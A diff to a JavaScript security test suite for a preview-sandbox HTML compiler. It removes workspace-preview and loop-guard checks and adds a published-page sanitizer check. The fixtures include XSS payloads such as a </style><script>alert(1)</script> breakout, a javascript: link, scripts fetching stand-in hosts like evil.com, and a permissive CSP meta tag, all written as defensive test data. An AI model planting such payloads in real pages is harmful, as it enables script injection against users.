@@ -529,11 +529,10 @@ describe('F-FORUM v3 Tier 5 Adversarial Hardening Suite', () => {
     }
   });
 
-  test('T5-A7: Preview sandbox CSP bypass, </style> breakout, </head> comment & loop-guard fixes', () => {
+  test('T5-A7: Preview sandbox CSP bypass, </style> breakout, and published page sanitizer fixes', () => {
     const script = [
-      "import vm from 'node:vm';",
       "import { compileSpecimenSrcDoc } from './src/features/explore/catalog.ts';",
-      "import { compileWorkspaceSrcDoc } from './src/features/workspace/LivePreviewFrame.tsx';",
+      "import { renderPublicPageHtml } from './server/publishedPagesStore.ts';",
       "const bypassDoc = '<!DOCTYPE html><html><head><!-- http-equiv=\"Content-Security-Policy\" --><meta http-equiv=\"Content-Security-Policy\" content=\"connect-src *\"></head><body>Hi</body></html>';",
       "const compiledSpecimen = compileSpecimenSrcDoc(bypassDoc, '</style><script>alert(1)</script>', 'dark');",
       "const hasSandboxCsp = compiledSpecimen.includes(\"connect-src 'none'\");",
@@ -542,33 +541,14 @@ describe('F-FORUM v3 Tier 5 Adversarial Hardening Suite', () => {
       "const snippetDoc = compileSpecimenSrcDoc('<div>hi</div>', '</style><img src=x>', 'light');",
       "const snippetRawCloseStyle = snippetDoc.includes('</style><img');",
       "const earlyHeadHtml = '<!DOCTYPE html><html><head><script>fetch(\"https://evil.com/early\")</script></head><body>Hi</body></html>';",
-      "const earlyWs = compileWorkspaceSrcDoc([{ path: 'index.html', content: earlyHeadHtml, language: 'html' }]);",
-      "const wsCspBeforeEarlyHeadScript = earlyWs.indexOf('Content-Security-Policy') !== -1 && earlyWs.indexOf('Content-Security-Policy') < earlyWs.indexOf('<script>fetch');",
       "const earlySpecHead = compileSpecimenSrcDoc(earlyHeadHtml, '', 'dark');",
       "const specCspBeforeEarlyHeadScript = earlySpecHead.indexOf('Content-Security-Policy') !== -1 && earlySpecHead.indexOf('Content-Security-Policy') < earlySpecHead.indexOf('<script>fetch');",
       "const earlyBetweenHtml = '<!DOCTYPE html><html><script>fetch(\"https://evil.com/early\")</script><head></head><body>Hi</body></html>';",
       "const earlySpecBetween = compileSpecimenSrcDoc(earlyBetweenHtml, '', 'dark');",
       "const specCspBeforeBetweenScript = earlySpecBetween.indexOf('Content-Security-Policy') !== -1 && earlySpecBetween.indexOf('Content-Security-Policy') < earlySpecBetween.indexOf('<script>fetch');",
-      "const earlyWsBetween = compileWorkspaceSrcDoc([{ path: 'index.html', content: earlyBetweenHtml, language: 'html' }]);",
-      "const wsCspBeforeBetweenScript = earlyWsBetween.indexOf('Content-Security-Policy') !== -1 && earlyWsBetween.indexOf('Content-Security-Policy') < earlyWsBetween.indexOf('<script>fetch');",
-      "const wsHtml = '<!DOCTYPE html><html><head><title>T</title></head><body><!-- </head> --><p>Body</p></body></html>';",
-      "const wsJs = 'do { x++; } while (true); for (let i=0; i<fn(); i++) { y++; } while ((a = next())) { z++; }';",
-      "const compiledWs = compileWorkspaceSrcDoc([{ path: 'index.html', content: wsHtml, language: 'html' }, { path: 'app.js', content: wsJs, language: 'javascript' }]);",
-      "const cspBeforeBody = compiledWs.indexOf('Content-Security-Policy') < compiledWs.indexOf('<body>');",
-      "const guardMatches = (compiledWs.match(/__ffGuard\\(\\)/g) || []).length;",
-      "const trickyJs = [",
-      "  'while (true) x++;',",
-      "  'for (;;) y++;',",
-      "  'do z++; while (true);',",
-      "  \"const r = /'/; while (true) { a++; }\",",
-      "  'const t = `${\"`\"}`; while (true) { b++; }',",
-      "].join('\\n');",
-      "const compiledTricky = compileWorkspaceSrcDoc([{ path: 'index.html', content: wsHtml, language: 'html' }, { path: 'app.js', content: trickyJs, language: 'javascript' }]);",
-      "const scriptMatch = compiledTricky.match(/<script>\\n([\\s\\S]*?)\\n<\\/script>/);",
-      "const compiledScriptBody = scriptMatch ? scriptMatch[1].replace(/<\\\\\\/script/g, '</script') : '';",
-      "new vm.Script(compiledScriptBody);",
-      "const trickyGuardMatches = (compiledScriptBody.match(/__ffGuard\\(\\);/g) || []).length;",
-      "console.log(JSON.stringify({ hasSandboxCsp, hasPermissiveCsp, hasRawCloseStyle, snippetRawCloseStyle, wsCspBeforeEarlyHeadScript, specCspBeforeEarlyHeadScript, specCspBeforeBetweenScript, wsCspBeforeBetweenScript, cspBeforeBody, guardMatches, trickyGuardMatches }));",
+      "const pubHtml = renderPublicPageHtml({ slug: 'test-og', title: 'Test OG', summary: 'Summary', authorName: 'A', category: 'tech', personality: 'modern', html: '<!DOCTYPE html><html><head></head><body><a href=\"javascript:alert(1)\">x</a></body></html>', sourceIds: [], likes: 0, remixes: 0, createdAt: '', updatedAt: '' });",
+      "const pubHasOg = pubHtml.includes('og:title') && pubHtml.includes('Tạo lại theo gu này');",
+      "console.log(JSON.stringify({ hasSandboxCsp, hasPermissiveCsp, hasRawCloseStyle, snippetRawCloseStyle, specCspBeforeEarlyHeadScript, specCspBeforeBetweenScript, pubHasOg }));",
     ].join('\n');
 
     const out = execFileSync('npx', ['tsx', '-e', script], {
@@ -580,23 +560,14 @@ describe('F-FORUM v3 Tier 5 Adversarial Hardening Suite', () => {
     assert.equal(res.hasPermissiveCsp, false);
     assert.equal(res.hasRawCloseStyle, false);
     assert.equal(res.snippetRawCloseStyle, false);
-    assert.equal(res.wsCspBeforeEarlyHeadScript, true);
     assert.equal(res.specCspBeforeEarlyHeadScript, true);
     assert.equal(res.specCspBeforeBetweenScript, true);
-    assert.equal(res.wsCspBeforeBetweenScript, true);
-    assert.equal(res.cspBeforeBody, true);
-    assert.ok(res.guardMatches >= 3, `Expected >= 3 loop guards injected, got ${res.guardMatches}`);
-    assert.equal(
-      res.trickyGuardMatches,
-      5,
-      `Expected 5 __ffGuard(); calls across brace-less loops + regex + nested template, got ${res.trickyGuardMatches}`
-    );
+    assert.equal(res.pubHasOg, true);
   });
 
   test('T5-A10: HTML tokenizer blocks CSP neutralization via attributes, RCDATA/RAWTEXT, HTML5 comments, early elements, and <meta name="a>b">', () => {
     const script = [
       "import { compileSpecimenSrcDoc } from './src/features/explore/catalog.ts';",
-      "import { compileWorkspaceSrcDoc } from './src/features/workspace/LivePreviewFrame.tsx';",
       "const attrDoc = '<!DOCTYPE html><html><body data-x=\"<head>\"><script>fetch(\"https://evil.example\")</script></body></html>';",
       "const headAttrDoc = '<!DOCTYPE html><html><head data-x=\">\"><script>fetch(\"https://evil.example\")</script></head><body>Hi</body></html>';",
       "const titleDoc = '<!DOCTYPE html><html><title><head></title><body><script>fetch(\"https://evil.example\")</script></body></html>';",
@@ -631,63 +602,35 @@ describe('F-FORUM v3 Tier 5 Adversarial Hardening Suite', () => {
       "  };",
       "}",
       "const specAttr = compileSpecimenSrcDoc(attrDoc, '', 'dark');",
-      "const wsAttr = compileWorkspaceSrcDoc([{ path: 'index.html', content: attrDoc, language: 'html' }]);",
       "const specHeadAttr = compileSpecimenSrcDoc(headAttrDoc, '', 'dark');",
-      "const wsHeadAttr = compileWorkspaceSrcDoc([{ path: 'index.html', content: headAttrDoc, language: 'html' }]);",
       "const specTitle = compileSpecimenSrcDoc(titleDoc, '', 'dark');",
-      "const wsTitle = compileWorkspaceSrcDoc([{ path: 'index.html', content: titleDoc, language: 'html' }]);",
       "const specTextarea = compileSpecimenSrcDoc(textareaDoc, '', 'dark');",
-      "const wsTextarea = compileWorkspaceSrcDoc([{ path: 'index.html', content: textareaDoc, language: 'html' }]);",
       "const specNoscript = compileSpecimenSrcDoc(noscriptDoc, '', 'dark');",
-      "const wsNoscript = compileWorkspaceSrcDoc([{ path: 'index.html', content: noscriptDoc, language: 'html' }]);",
       "const specTemplate = compileSpecimenSrcDoc(templateDoc, '', 'dark');",
-      "const wsTemplate = compileWorkspaceSrcDoc([{ path: 'index.html', content: templateDoc, language: 'html' }]);",
       "const specSvg = compileSpecimenSrcDoc(svgDoc, '', 'dark');",
-      "const wsSvg = compileWorkspaceSrcDoc([{ path: 'index.html', content: svgDoc, language: 'html' }]);",
       "const specMetaGt = compileSpecimenSrcDoc(metaAttrGtDoc, '', 'dark');",
-      "const wsMetaGt = compileWorkspaceSrcDoc([{ path: 'index.html', content: metaAttrGtDoc, language: 'html' }]);",
       "const specAbrupt = compileSpecimenSrcDoc(abruptCommentDoc, '', 'dark');",
-      "const wsAbrupt = compileWorkspaceSrcDoc([{ path: 'index.html', content: abruptCommentDoc, language: 'html' }]);",
       "const specAbruptDash = compileSpecimenSrcDoc(abruptDashCommentDoc, '', 'dark');",
-      "const wsAbruptDash = compileWorkspaceSrcDoc([{ path: 'index.html', content: abruptDashCommentDoc, language: 'html' }]);",
       "const specBang = compileSpecimenSrcDoc(bangCommentDoc, '', 'dark');",
-      "const wsBang = compileWorkspaceSrcDoc([{ path: 'index.html', content: bangCommentDoc, language: 'html' }]);",
       "const specEarlyStyle = compileSpecimenSrcDoc(earlyStyleDoc, '', 'dark');",
-      "const wsEarlyStyle = compileWorkspaceSrcDoc([{ path: 'index.html', content: earlyStyleDoc, language: 'html' }]);",
       "const specEarlyVideo = compileSpecimenSrcDoc(earlyVideoDoc, '', 'dark');",
-      "const wsEarlyVideo = compileWorkspaceSrcDoc([{ path: 'index.html', content: earlyVideoDoc, language: 'html' }]);",
       "const specMetaRefresh = compileSpecimenSrcDoc(metaRefreshDoc, '', 'dark');",
-      "const wsMetaRefresh = compileWorkspaceSrcDoc([{ path: 'index.html', content: metaRefreshDoc, language: 'html' }]);",
       "const specMetaRefreshSnippet = compileSpecimenSrcDoc(metaRefreshSnippet, '', 'dark');",
       "console.log(JSON.stringify({",
       "  specAttr: { ...checkCsp(specAttr, \"connect-src 'none'\"), intactDataX: specAttr.includes('data-x=\"<head>\"') },",
-      "  wsAttr: { ...checkCsp(wsAttr, \"default-src 'none'\"), intactDataX: wsAttr.includes('data-x=\"<head>\"') },",
       "  specHeadAttr: { ...checkCsp(specHeadAttr, \"connect-src 'none'\"), intactHeadDataX: specHeadAttr.includes('data-x=\">\"'), cspAfterDataX: specHeadAttr.indexOf('data-x=\">\"') < specHeadAttr.indexOf('Content-Security-Policy') },",
-      "  wsHeadAttr: { ...checkCsp(wsHeadAttr, \"default-src 'none'\"), intactHeadDataX: wsHeadAttr.includes('data-x=\">\"'), cspAfterDataX: wsHeadAttr.indexOf('data-x=\">\"') < wsHeadAttr.indexOf('Content-Security-Policy') },",
       "  specTitle: { ...checkCsp(specTitle, \"connect-src 'none'\"), intactTitle: specTitle.includes('<title><head></title>') },",
-      "  wsTitle: { ...checkCsp(wsTitle, \"default-src 'none'\"), intactTitle: wsTitle.includes('<title><head></title>') },",
       "  specTextarea: { ...checkCsp(specTextarea, \"connect-src 'none'\"), intactTextarea: specTextarea.includes('<textarea><head></textarea>') },",
-      "  wsTextarea: { ...checkCsp(wsTextarea, \"default-src 'none'\"), intactTextarea: wsTextarea.includes('<textarea><head></textarea>') },",
       "  specNoscript: { ...checkCsp(specNoscript, \"connect-src 'none'\"), intactNoscript: specNoscript.includes('<noscript><head></noscript>') },",
-      "  wsNoscript: { ...checkCsp(wsNoscript, \"default-src 'none'\"), intactNoscript: wsNoscript.includes('<noscript><head></noscript>') },",
       "  specTemplate: { ...checkCsp(specTemplate, \"connect-src 'none'\"), intactTemplate: specTemplate.includes('<template><head></template>') },",
-      "  wsTemplate: { ...checkCsp(wsTemplate, \"default-src 'none'\"), intactTemplate: wsTemplate.includes('<template><head></template>') },",
       "  specSvg: { ...checkCsp(specSvg, \"connect-src 'none'\"), intactSvg: specSvg.includes('<svg><head></svg>') },",
-      "  wsSvg: { ...checkCsp(wsSvg, \"default-src 'none'\"), intactSvg: wsSvg.includes('<svg><head></svg>') },",
       "  specMetaGt: { ...checkCsp(specMetaGt, \"connect-src 'none'\"), strippedPermissive: !specMetaGt.includes('connect-src *'), strippedAttrGt: !specMetaGt.includes('name=\"a>b\"') },",
-      "  wsMetaGt: { ...checkCsp(wsMetaGt, \"default-src 'none'\"), strippedPermissive: !wsMetaGt.includes('connect-src *'), strippedAttrGt: !wsMetaGt.includes('name=\"a>b\"') },",
       "  specAbrupt: checkCsp(specAbrupt, \"connect-src 'none'\"),",
-      "  wsAbrupt: checkCsp(wsAbrupt, \"default-src 'none'\"),",
       "  specAbruptDash: checkCsp(specAbruptDash, \"connect-src 'none'\"),",
-      "  wsAbruptDash: checkCsp(wsAbruptDash, \"default-src 'none'\"),",
       "  specBang: checkCsp(specBang, \"connect-src 'none'\"),",
-      "  wsBang: checkCsp(wsBang, \"default-src 'none'\"),",
       "  specEarlyStyle: checkCsp(specEarlyStyle, \"connect-src 'none'\"),",
-      "  wsEarlyStyle: checkCsp(wsEarlyStyle, \"default-src 'none'\"),",
       "  specEarlyVideo: checkCsp(specEarlyVideo, \"connect-src 'none'\"),",
-      "  wsEarlyVideo: checkCsp(wsEarlyVideo, \"default-src 'none'\"),",
       "  specMetaRefresh: { ...checkCsp(specMetaRefresh, \"connect-src 'none'\"), noRefresh: !/http-equiv\\s*=\\s*[\"']?[^\"'>]*(?:refresh|&#114;efresh|set-cookie|location)/i.test(specMetaRefresh) && !specMetaRefresh.includes('https://example.com/refresh') },",
-      "  wsMetaRefresh: { ...checkCsp(wsMetaRefresh, \"default-src 'none'\"), noRefresh: !/http-equiv\\s*=\\s*[\"']?[^\"'>]*(?:refresh|&#114;efresh|set-cookie|location)/i.test(wsMetaRefresh) && !wsMetaRefresh.includes('https://example.com/refresh') },",
       "  specMetaRefreshSnippet: { ...checkCsp(specMetaRefreshSnippet, \"connect-src 'none'\"), noRefresh: !/http-equiv\\s*=\\s*[\"']?refresh/i.test(specMetaRefreshSnippet) && !specMetaRefreshSnippet.includes('https://example.com/refresh'), hasDivHi: specMetaRefreshSnippet.includes('<div>hi</div>') },",
       "}));",
     ].join('\n');
@@ -710,27 +653,16 @@ describe('F-FORUM v3 Tier 5 Adversarial Hardening Suite', () => {
       assert.equal(check.beforeSvg, true, `${label}: CSP must precede <svg>`);
     }
     assert.equal(res.specAttr.intactDataX, true);
-    assert.equal(res.wsAttr.intactDataX, true);
     assert.equal(res.specHeadAttr.intactHeadDataX, true);
     assert.equal(res.specHeadAttr.cspAfterDataX, true);
-    assert.equal(res.wsHeadAttr.intactHeadDataX, true);
-    assert.equal(res.wsHeadAttr.cspAfterDataX, true);
     assert.equal(res.specTitle.intactTitle, true);
-    assert.equal(res.wsTitle.intactTitle, true);
     assert.equal(res.specTextarea.intactTextarea, true);
-    assert.equal(res.wsTextarea.intactTextarea, true);
     assert.equal(res.specNoscript.intactNoscript, true);
-    assert.equal(res.wsNoscript.intactNoscript, true);
     assert.equal(res.specTemplate.intactTemplate, true);
-    assert.equal(res.wsTemplate.intactTemplate, true);
     assert.equal(res.specSvg.intactSvg, true);
-    assert.equal(res.wsSvg.intactSvg, true);
     assert.equal(res.specMetaGt.strippedPermissive, true);
     assert.equal(res.specMetaGt.strippedAttrGt, true);
-    assert.equal(res.wsMetaGt.strippedPermissive, true);
-    assert.equal(res.wsMetaGt.strippedAttrGt, true);
     assert.equal(res.specMetaRefresh.noRefresh, true);
-    assert.equal(res.wsMetaRefresh.noRefresh, true);
     assert.equal(res.specMetaRefreshSnippet.noRefresh, true);
     assert.equal(res.specMetaRefreshSnippet.hasDivHi, true);
   });
